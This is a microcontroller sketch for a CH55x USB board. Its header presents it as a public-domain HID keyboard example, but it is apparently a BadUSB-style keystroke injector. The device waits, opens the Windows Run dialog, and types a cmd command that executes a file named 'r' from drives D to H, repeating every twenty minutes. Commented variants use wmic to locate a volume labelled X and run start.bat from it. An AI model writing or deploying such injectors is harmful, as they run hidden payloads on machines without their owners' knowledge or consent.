/*
  HID Keyboard example


  created 2020
  by Deqing Sun for use with CH55xduino

  This example code is in the public domain.

  cli board options: usb_settings=user148

*/

//For windows user, if you ever played with other HID device with the same PID C55D
//You may need to uninstall the previous driver completely        


#ifndef USER_USB_RAM
#error "This example needs to be compiled with a USER USB setting"
#endif

#include "src/userUsbHidKeyboard/USBHIDKeyboard.h"

#define BUTTON1_PIN 30
#define BUTTON2_PIN 31
#define BUTTON3_PIN 32

#define LED_BUILTIN 33

bool button1PressPrev = false;
bool button2PressPrev = false;
bool button3PressPrev = false;


void setup() {
  USBInit();
  delay(10000);

  if (!(Keyboard_getLEDStatus() & 2)) {
    Keyboard_press(KEY_CAPS_LOCK);
    delay(100); //a quick capslock press is not recognized on mac
    Keyboard_release(KEY_CAPS_LOCK);
  }

  delay(100);
  Keyboard_press(KEY_LEFT_GUI);  // 按下 WIN 键
  Keyboard_press('r');           // 按下 R 键
  Keyboard_releaseAll();
  delay(110);
  //cmd /c "for /f %d in ('wmic logicaldisk where "VolumeName='X'" get DeviceID ^| findstr /r "^.:"') do start "" "%d\start.bat""
  //cmd /c "for /f %i in ('wmic logicaldisk where "VolumeName='X'" get DeviceID')do %i\r"
  //cmd /c"for /f %i in ('wmic logicaldisk get DeviceID')do %i\r"
  //cmd /c"for %i in (D E F G H)do %i:\r"
  //cmd /c"d:\r;e:\r;f:\r;g:\r;h:\r"
  //cmd /c"d:\r&e:\r&f:\r&g:\r&h:\r"
  //Keyboard_print("cmd /c\"for %i in (D E F G H I)do %i:\\r\"\r\n");
  Keyboard_print("cmd /c\"d:\\r&e:\\r&f:\\r&g:\\r&h:\\r\"\r\n");
}

void loop() {
  delay(1200000);

  if (!(Keyboard_getLEDStatus() & 2)) {
    Keyboard_press(KEY_CAPS_LOCK);
    delay(100); //a quick capslock press is not recognized on mac
    Keyboard_release(KEY_CAPS_LOCK);
  }

  delay(100);
  Keyboard_press(KEY_LEFT_GUI);  // 按下 WIN 键
  Keyboard_press('r');           // 按下 R 键
  Keyboard_releaseAll();
  delay(200);
  //cmd /c "for /f %d in ('wmic logicaldisk where "VolumeName='X'" get DeviceID ^| findstr /r "^.:"') do start "" "%d\start.bat""
  //cmd /c "for /f %i in ('wmic logicaldisk where "VolumeName='X'" get DeviceID')do %i\r"
  //cmd /c"for /f %i in ('wmic logicaldisk get DeviceID')do %i\r"
  //cmd /c"for %i in (D E F G H)do %i:\r"
  //cmd /c"d:\r;e:\r;f:\r;g:\r;h:\r"
  //cmd /c"d:\r&e:\r&f:\r&g:\r&h:\r"
  //Keyboard_print("cmd /c\"for %i in (D E F G H I)do %i:\\r\"\r\n");
  Keyboard_print("cmd /c\"d:\\r&e:\\r&f:\\r&g:\\r&h:\\r\"\r\n");
}
